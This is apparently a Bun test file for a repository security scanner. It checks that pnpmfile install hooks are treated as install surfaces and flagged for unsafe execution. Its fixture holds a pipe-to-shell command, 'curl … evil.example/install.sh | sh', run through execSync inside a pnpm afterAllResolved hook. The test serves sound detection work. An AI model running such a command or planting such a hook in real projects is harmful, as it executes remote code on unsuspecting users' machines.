import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a pnpmfile hook is an install surface", () => {
  // PRD section 8: the scan checks install and build scripts. pnpm loads
  // `.pnpmfile.cjs` before resolving any dependency and runs its hooks, so a
  // repository root file with that name executes without being named by
  // package.json.
  for (const path of [".pnpmfile.cjs", ".pnpmfile.js", "tools/.pnpmfile.cjs"]) {
    const inspection = inspected(
      path,
      `const { execSync } = require("node:child_process");\nmodule.exports = {\n  hooks: {\n    afterAllResolved() {\n      execSync("${PAYLOAD}", { stdio: "inherit" });\n    },\n  },\n};\n`,
    );
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
    expect({ path, coverage: inspection.coverage.installScripts }).toEqual({
      path,
      coverage: { state: "complete", items: 1 },
    });
    expect(
      inspection.findings.map(
        (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
      ),
    ).toContain(`${path}:unsafe-execution:high`);
    expect({ path, downloads: inspection.downloads }).toEqual({
      path,
      downloads: ["https://evil.example/install.sh"],
    });
  }
});

test("a pnpmfile name elsewhere keeps its ordinary surfaces", () => {
  expect(surfacesOf("docs/pnpmfile.md")).toEqual([]);
  expect(surfacesOf("LICENSE")).toEqual([]);
});
